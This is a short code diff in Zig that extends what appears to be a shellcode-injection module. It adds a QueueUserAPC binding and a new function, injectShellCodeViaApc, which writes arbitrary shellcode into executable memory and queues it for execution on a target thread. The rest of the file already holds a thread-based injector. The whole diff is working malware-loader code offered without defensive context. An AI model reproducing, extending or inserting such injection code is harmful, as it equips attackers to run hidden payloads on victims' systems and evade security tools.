@@ -5,6 +5,7 @@ const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
 const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
 const INFINITE = win.INFINITE;
 const SECURITY_ATTRIBUTES = win.SECURITY_ATTRIBUTES;
+const HANDLE = win.HANDLE;
 
 const VirtualAlloc = win.VirtualAlloc;
 const VirtualProtect = win.VirtualProtect;
@@ -12,6 +13,7 @@ const VirtualFree = win.VirtualFree;
 const CreateThread = win.CreateThread;
 const CloseHandle = win.CloseHandle;
 const WaitForSingleObject = win.WaitForSingleObject;
+const QueueUserAPC = win.QueueUserAPC;
 const GetLastError = win.GetLastError;
 
 pub fn allocateMemory(data: []const u8) !*anyopaque {
@@ -72,4 +74,13 @@ pub fn injectShellCodeToProcess(shell_code: []const u8) !void {
     defer _ = freeVirtualMemory(shell_code_region);
 
     try executeInNewThread(@ptrCast(shell_code_region), null);
+}
+
+pub fn injectShellCodeViaApc(h_thread: HANDLE, shell_code: []const u8) !void {
+    const shell_code_region = try allocateExecutableMemory(shell_code);
+
+    if (QueueUserAPC(@ptrCast(shell_code_region), h_thread, 0) == 0) {
+        std.debug.print("[!] QueueUserAPC Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.QueueUserAPCFailed;
+    }
 }
